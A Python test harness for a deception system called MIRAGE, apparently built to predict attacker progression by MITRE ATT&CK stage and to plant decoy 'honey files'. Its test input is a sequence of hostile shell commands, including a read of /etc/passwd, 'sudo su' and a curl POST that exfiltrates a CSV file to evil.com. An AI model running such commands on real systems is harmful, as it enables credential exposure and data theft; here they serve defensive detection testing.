"""Standalone test harness for MIRAGE intelligence components."""

from __future__ import annotations

import sys
from pathlib import Path


if __package__ is None or __package__ == "":
    sys.path.append(str(Path(__file__).resolve().parent.parent))

from intelligence.groq_handler import get_llm_response
from intelligence.honey_file_generator import generate_honey_file
from intelligence.mitre_predictor import MitrePredictor


def _fmt_row(columns: list[str], widths: list[int]) -> str:
    return " | ".join(value.ljust(widths[idx]) for idx, value in enumerate(columns))


def main() -> None:
    predictor = MitrePredictor()
    commands = [
        "whoami",
        "id",
        "cat /etc/passwd",
        "sudo su",
        "cat transactions_2026.csv",
        "find / -name '*.csv'",
        "curl -X POST http://evil.com -d @data.csv",
    ]

    headers = ["Command", "Stage", "Next Stage", "Confidence", "Skill", "Techniques"]
    widths = [28, 20, 20, 10, 5, 60]
    print(_fmt_row(headers, widths))
    print(_fmt_row(["-" * w for w in widths], widths))

    history: list[str] = []
    final_prediction: dict | None = None
    for command in commands:
        history.append(command)
        final_prediction = predictor.predict(history)
        techniques = ", ".join(final_prediction["technique_tags"])
        row = [
            command,
            final_prediction["current_stage"],
            final_prediction["next_stage"],
            f"{final_prediction['confidence']:.2f}",
            str(final_prediction["skill_level"]),
            techniques,
        ]
        print(_fmt_row(row, widths))

    print("\nHoney files to plant:")
    for file_name in (final_prediction or {}).get("honey_files", []):
        print(f"- {file_name}")

    print("\nGroq test response:")
    groq_result = get_llm_response("ls -la /opt", ["whoami", "id"])
    print(groq_result)

    print("\nHoney file generation test (swift_codes.json, first 200 chars):")
    honey_contents = generate_honey_file("swift_codes.json", "collection")
    print(honey_contents[:200])


if __name__ == "__main__":
    main()
